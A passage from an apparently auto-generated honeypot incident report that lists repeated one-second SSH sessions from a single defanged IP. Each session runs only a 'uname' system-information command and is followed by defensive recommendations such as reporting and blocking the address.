| `2026-07-24 15:15:29` | `cowrie.session.params` |
| `2026-07-24 15:15:29` | `cowrie.command.input` |
| `2026-07-24 15:15:29` | `cowrie.log.closed` |
| `2026-07-24 15:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8ba4d5de8b9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:33` | `cowrie.session.connect` |
| `2026-07-24 15:15:33` | `cowrie.client.version` |
| `2026-07-24 15:15:34` | `cowrie.client.kex` |
| `2026-07-24 15:15:34` | `cowrie.login.success` |
| `2026-07-24 15:15:35` | `cowrie.session.params` |
| `2026-07-24 15:15:35` | `cowrie.command.input` |
| `2026-07-24 15:15:35` | `cowrie.log.closed` |
| `2026-07-24 15:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7220841842ff

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:40` | `cowrie.session.connect` |
| `2026-07-24 15:15:40` | `cowrie.client.version` |
| `2026-07-24 15:15:40` | `cowrie.client.kex` |
| `2026-07-24 15:15:40` | `cowrie.login.success` |
| `2026-07-24 15:15:41` | `cowrie.session.params` |
| `2026-07-24 15:15:41` | `cowrie.command.input` |
| `2026-07-24 15:15:41` | `cowrie.log.closed` |
| `2026-07-24 15:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6ded42a1db

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:46` | `cowrie.session.connect` |
| `2026-07-24 15:15:46` | `cowrie.client.version` |
| `2026-07-24 15:15:46` | `cowrie.client.kex` |
| `2026-07-24 15:15:46` | `cowrie.login.success` |
| `2026-07-24 15:15:47` | `cowrie.session.params` |
| `2026-07-24 15:15:47` | `cowrie.command.input` |
| `2026-07-24 15:15:47` | `cowrie.log.closed` |
| `2026-07-24 15:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1f04aca695f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:52` | `cowrie.session.connect` |
| `2026-07-24 15:15:52` | `cowrie.client.version` |
| `2026-07-24 15:15:52` | `cowrie.client.kex` |
| `2026-07-24 15:15:53` | `cowrie.login.success` |
| `2026-07-24 15:15:53` | `cowrie.session.params` |
| `2026-07-24 15:15:53` | `cowrie.command.input` |
| `2026-07-24 15:15:53` | `cowrie.log.closed` |
| `2026-07-24 15:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53932e281bbb

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:15 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:15:58` | `cowrie.session.connect` |
| `2026-07-24 15:15:59` | `cowrie.client.version` |
| `2026-07-24 15:15:59` | `cowrie.client.kex` |
| `2026-07-24 15:15:59` | `cowrie.login.success` |
| `2026-07-24 15:16:00` | `cowrie.session.params` |
| `2026-07-24 15:16:00` | `cowrie.command.input` |
| `2026-07-24 15:16:00` | `cowrie.log.closed` |
| `2026-07-24 15:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e57fbbac7d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:05` | `cowrie.session.connect` |
| `2026-07-24 15:16:05` | `cowrie.client.version` |
| `2026-07-24 15:16:05` | `cowrie.client.kex` |
| `2026-07-24 15:16:06` | `cowrie.login.success` |
| `2026-07-24 15:16:06` | `cowrie.session.params` |
| `2026-07-24 15:16:06` | `cowrie.command.input` |
| `2026-07-24 15:16:07` | `cowrie.log.closed` |
| `2026-07-24 15:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6f646fa000

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:11` | `cowrie.session.connect` |
| `2026-07-24 15:16:11` | `cowrie.client.version` |
| `2026-07-24 15:16:11` | `cowrie.client.kex` |
| `2026-07-24 15:16:12` | `cowrie.login.success` |
| `2026-07-24 15:16:13` | `cowrie.session.params` |
| `2026-07-24 15:16:13` | `cowrie.command.input` |
| `2026-07-24 15:16:13` | `cowrie.log.closed` |
| `2026-07-24 15:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8931c75b91e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:17` | `cowrie.session.connect` |
| `2026-07-24 15:16:17` | `cowrie.client.version` |
| `2026-07-24 15:16:17` | `cowrie.client.kex` |
| `2026-07-24 15:16:18` | `cowrie.login.success` |
| `2026-07-24 15:16:19` | `cowrie.session.params` |
| `2026-07-24 15:16:19` | `cowrie.command.input` |
| `2026-07-24 15:16:19` | `cowrie.log.closed` |
| `2026-07-24 15:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5d472d3ec9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:22` | `cowrie.session.connect` |
| `2026-07-24 15:16:23` | `cowrie.client.version` |
| `2026-07-24 15:16:23` | `cowrie.client.kex` |
| `2026-07-24 15:16:23` | `cowrie.login.success` |
| `2026-07-24 15:16:24` | `cowrie.session.params` |
| `2026-07-24 15:16:24` | `cowrie.command.input` |
| `2026-07-24 15:16:24` | `cowrie.log.closed` |
| `2026-07-24 15:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c9dad51c43

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:28` | `cowrie.session.connect` |
| `2026-07-24 15:16:28` | `cowrie.client.version` |
| `2026-07-24 15:16:28` | `cowrie.client.kex` |
| `2026-07-24 15:16:29` | `cowrie.login.success` |
| `2026-07-24 15:16:29` | `cowrie.session.params` |
| `2026-07-24 15:16:29` | `cowrie.command.input` |
| `2026-07-24 15:16:30` | `cowrie.log.closed` |
| `2026-07-24 15:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc88225e4256

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:33` | `cowrie.session.connect` |
| `2026-07-24 15:16:33` | `cowrie.client.version` |
| `2026-07-24 15:16:33` | `cowrie.client.kex` |
| `2026-07-24 15:16:34` | `cowrie.login.success` |
| `2026-07-24 15:16:35` | `cowrie.session.params` |
| `2026-07-24 15:16:35` | `cowrie.command.input` |
| `2026-07-24 15:16:35` | `cowrie.log.closed` |
| `2026-07-24 15:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe3e794f4b9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:40` | `cowrie.session.connect` |
| `2026-07-24 15:16:40` | `cowrie.client.version` |
| `2026-07-24 15:16:40` | `cowrie.client.kex` |
| `2026-07-24 15:16:40` | `cowrie.login.success` |
| `2026-07-24 15:16:41` | `cowrie.session.params` |
| `2026-07-24 15:16:41` | `cowrie.command.input` |
| `2026-07-24 15:16:41` | `cowrie.log.closed` |
| `2026-07-24 15:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ce9b5c7908

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:46` | `cowrie.session.connect` |
| `2026-07-24 15:16:46` | `cowrie.client.version` |
| `2026-07-24 15:16:46` | `cowrie.client.kex` |
| `2026-07-24 15:16:46` | `cowrie.login.success` |
| `2026-07-24 15:16:47` | `cowrie.session.params` |
| `2026-07-24 15:16:47` | `cowrie.command.input` |
| `2026-07-24 15:16:47` | `cowrie.log.closed` |
| `2026-07-24 15:16:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2d4358caa83

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:52` | `cowrie.session.connect` |
| `2026-07-24 15:16:52` | `cowrie.client.version` |
| `2026-07-24 15:16:52` | `cowrie.client.kex` |
| `2026-07-24 15:16:52` | `cowrie.login.success` |
| `2026-07-24 15:16:53` | `cowrie.session.params` |
| `2026-07-24 15:16:53` | `cowrie.command.input` |
| `2026-07-24 15:16:53` | `cowrie.log.closed` |
| `2026-07-24 15:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adfaaaa6f04e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:16 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:16:58` | `cowrie.session.connect` |
| `2026-07-24 15:16:58` | `cowrie.client.version` |
| `2026-07-24 15:16:58` | `cowrie.client.kex` |
| `2026-07-24 15:16:59` | `cowrie.login.success` |
| `2026-07-24 15:16:59` | `cowrie.session.params` |
| `2026-07-24 15:16:59` | `cowrie.command.input` |
| `2026-07-24 15:17:00` | `cowrie.log.closed` |
| `2026-07-24 15:17:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebf655339b0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:04` | `cowrie.session.connect` |
| `2026-07-24 15:17:04` | `cowrie.client.version` |
| `2026-07-24 15:17:04` | `cowrie.client.kex` |
| `2026-07-24 15:17:05` | `cowrie.login.success` |
| `2026-07-24 15:17:06` | `cowrie.session.params` |
| `2026-07-24 15:17:06` | `cowrie.command.input` |
| `2026-07-24 15:17:06` | `cowrie.log.closed` |
| `2026-07-24 15:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd92ee1fb57c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:10` | `cowrie.session.connect` |
| `2026-07-24 15:17:10` | `cowrie.client.version` |
| `2026-07-24 15:17:10` | `cowrie.client.kex` |
| `2026-07-24 15:17:11` | `cowrie.login.success` |
| `2026-07-24 15:17:11` | `cowrie.session.params` |
| `2026-07-24 15:17:11` | `cowrie.command.input` |
| `2026-07-24 15:17:11` | `cowrie.log.closed` |
| `2026-07-24 15:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c5c2e47217d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:16` | `cowrie.session.connect` |
| `2026-07-24 15:17:16` | `cowrie.client.version` |
| `2026-07-24 15:17:16` | `cowrie.client.kex` |
| `2026-07-24 15:17:17` | `cowrie.login.success` |
| `2026-07-24 15:17:18` | `cowrie.session.params` |
| `2026-07-24 15:17:18` | `cowrie.command.input` |
| `2026-07-24 15:17:18` | `cowrie.log.closed` |
| `2026-07-24 15:17:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1fc860ff96f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:23` | `cowrie.session.connect` |
| `2026-07-24 15:17:23` | `cowrie.client.version` |
| `2026-07-24 15:17:23` | `cowrie.client.kex` |
| `2026-07-24 15:17:23` | `cowrie.login.success` |
| `2026-07-24 15:17:24` | `cowrie.session.params` |
| `2026-07-24 15:17:24` | `cowrie.command.input` |
| `2026-07-24 15:17:24` | `cowrie.log.closed` |
| `2026-07-24 15:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88489eed6183

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:29` | `cowrie.session.connect` |
| `2026-07-24 15:17:29` | `cowrie.client.version` |
| `2026-07-24 15:17:29` | `cowrie.client.kex` |
| `2026-07-24 15:17:29` | `cowrie.login.success` |
| `2026-07-24 15:17:30` | `cowrie.session.params` |
| `2026-07-24 15:17:30` | `cowrie.command.input` |
| `2026-07-24 15:17:30` | `cowrie.log.closed` |
| `2026-07-24 15:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3afdf90146f3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:35` | `cowrie.session.connect` |
| `2026-07-24 15:17:35` | `cowrie.client.version` |
| `2026-07-24 15:17:35` | `cowrie.client.kex` |
| `2026-07-24 15:17:36` | `cowrie.login.success` |
| `2026-07-24 15:17:37` | `cowrie.session.params` |
| `2026-07-24 15:17:37` | `cowrie.command.input` |
| `2026-07-24 15:17:37` | `cowrie.log.closed` |
| `2026-07-24 15:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83f1860854f7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:41` | `cowrie.session.connect` |
| `2026-07-24 15:17:41` | `cowrie.client.version` |
| `2026-07-24 15:17:41` | `cowrie.client.kex` |
| `2026-07-24 15:17:42` | `cowrie.login.success` |
| `2026-07-24 15:17:43` | `cowrie.session.params` |
| `2026-07-24 15:17:43` | `cowrie.command.input` |
| `2026-07-24 15:17:43` | `cowrie.log.closed` |
| `2026-07-24 15:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936e89a954b3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:47` | `cowrie.session.connect` |
| `2026-07-24 15:17:47` | `cowrie.client.version` |
| `2026-07-24 15:17:47` | `cowrie.client.kex` |
| `2026-07-24 15:17:48` | `cowrie.login.success` |
| `2026-07-24 15:17:49` | `cowrie.session.params` |
| `2026-07-24 15:17:49` | `cowrie.command.input` |
| `2026-07-24 15:17:49` | `cowrie.log.closed` |
| `2026-07-24 15:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d9ffe64d8c8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:17 |
| **Last Seen** | 2026-07-24 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:17:54` | `cowrie.session.connect` |
| `2026-07-24 15:17:54` | `cowrie.client.version` |
| `2026-07-24 15:17:54` | `cowrie.client.kex` |
| `2026-07-24 15:17:54` | `cowrie.login.success` |
| `2026-07-24 15:17:55` | `cowrie.session.params` |
| `2026-07-24 15:17:55` | `cowrie.command.input` |
| `2026-07-24 15:17:55` | `cowrie.log.closed` |
| `2026-07-24 15:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-946512fe8f91

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:18:00` | `cowrie.session.connect` |
| `2026-07-24 15:18:00` | `cowrie.client.version` |
| `2026-07-24 15:18:00` | `cowrie.client.kex` |
| `2026-07-24 15:18:00` | `cowrie.login.success` |
| `2026-07-24 15:18:01` | `cowrie.session.params` |
| `2026-07-24 15:18:01` | `cowrie.command.input` |
| `2026-07-24 15:18:01` | `cowrie.log.closed` |
| `2026-07-24 15:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80a13721a994

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:18 |
| **Last Seen** | 2026-07-24 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
